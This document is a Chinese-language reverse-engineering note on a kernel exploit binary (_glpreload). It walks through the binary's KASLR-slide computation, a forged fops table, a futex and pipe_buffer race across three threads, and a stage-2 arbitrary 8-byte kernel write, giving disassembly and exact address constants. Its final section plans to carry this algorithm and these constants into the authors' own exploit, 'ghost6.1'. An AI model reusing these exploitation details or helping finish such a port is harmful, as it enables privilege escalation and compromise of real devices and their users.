# consumer_thread 第二阶段（stage==2）内核写入 —— 逐指令结论

来源：D:\deepseek work\_glpreload（sha256 4980bb4f…，6,470,288 B），consumer_thread 0x626218–0x626414，exploit_main 0x626b78–0x626ef4。

## 1. 全局约定（已证实）
- 0x636000+0xf38 存的是 KASLR slide（get_kaslr_offset 的返回值；exploit_main 0x626bbc 直接 str 进去，二次进入 0x626bb0 读缓存）。
- 0x637028 = slide + 0xffffff8000000000（0x626bd8/0x626be8），作为 KIMAGE 基准。
- 所有内核地址常量都是链接期绝对 VA（link base 0xffffffc008000000 段），运行时统一 + slide。
- fops 表（0x637038，BSS 内 0x100 字节）由 exploit_main 填：
  - [0x08] = slide+0x87bb14c；[0xe0] = 上面 +0x1c0
  - [0x60] = slide+0x8474c0；[0x70] = 上面 +0x230；[0x80] = 上面 +0x2b8
  - [0x20] 起 16 字节 = 链接期字面值 0xffffffc008477f84 / 0xffffffc0087bb2b4（.rodata 0x1800 那一对）各自 + slide

## 2. 三线程职责
- waiter_thread(0x626414)：cpubind_bind(0) -> sched_setattr_tid(-20) -> futex_op(0xfe0,6) -> 置 0xfe4=1 -> 等 0xfe8 -> clock_gettime(+5s) -> futex_op(0xfe0,11 WAIT_BITSET) -> futex_op(0xfe0,7) -> sig_stack_copy() -> 收尾。
- consumer_thread(0x626218)：cpubind_bind(1) -> nice -20 -> 轮询 0xfc0(命中计数)/0xfcc(停止)；命中数变化则 sleep(1)；命中数==1 则 usleep(50000)；读 0xfd0(owner tid)、0xfd4++ -> 等 0xfc8 门 -> sched_setattr_tid(-19) -> 读 0xfd8(stage)。
- owner_thread(0x62669c)：nice +19，持 pipe_buffer，futex 6/7 握手，命中后 pause()。

## 3. stage==2 的公开写（竞态胜出后的落地动作）
    0x626330: ldr  w8,[0x636000+0xfd8]        // stage
    0x62633c: cmp  w8,#2 ; b.ne skip
    0x62634c: bl   open_ashmem_device()
    0x62635c: str  w0,[0x633000+0xe68]        // 存 ashmem fd
    0x626360: ldr  x9,[0x636000+0xf38]        // slide
    0x626358..0x626380: 拼 K2=0xffffffc009274ad8、K1=0xffffffc0a53fc2c0
    0x626388: str  (slide+K2),[sp+0x18]       // 待写值
    0x626394: bl   kernel_write_data(fd, slide+K1, &val, 8)
    0x62639c: cmp  x0,#8 ; b.ne perror(0x2000+0xa39)
即：stage 2 时把 8 字节指针 (slide+0xffffffc009274ad8) 写到 (slide+0xffffffc0a53fc2c0)；写不满 8 字节就 perror 并跳过成功计数。
- K1 - 0xffffffc008000000 = 0x253fc2c0（约 624 MB，落在 image 之后的区段）；K2 - 0xffffffc008000000 = 0x1274ad8（约 19.3 MB，image 内 text/data）。
- 结构语义：把一个 image 内指针写进 image 外 624 MB 处的 8 字节槽，典型用途是 patch 某个 per-cpu/全局指针，供随后 pipe_buffer 伪造使用。

## 4. 对我方 ghost6.1 的影响
- ghost_race_take_pipe() 原来只认 GHOST_PIPE_BUF / GHOST_FAKE_PAGE 两个环境变量，属占位；现在有了明确算法：胜出后按 stage 2 语义做上面那一次 8 字节写。
- 进 map 的常量从 2 个变成 3 组：(a) 写目标 K1=0xa53fc2c0；(b) 写入值 K2=0x1274ad8；(c) fops 表 0x87bb14c/+0x1c0/0x8474c0/+0x230/+0x2b8 与 .rodata 那对 0xffffffc008477f84 / 0xffffffc0087bb2b4（均相对 link base）。
- 这些必须对目标 build 取真值（kallsyms/BTF）；6.6.118 这套数字只证明算法，不能跨 build 直接用。
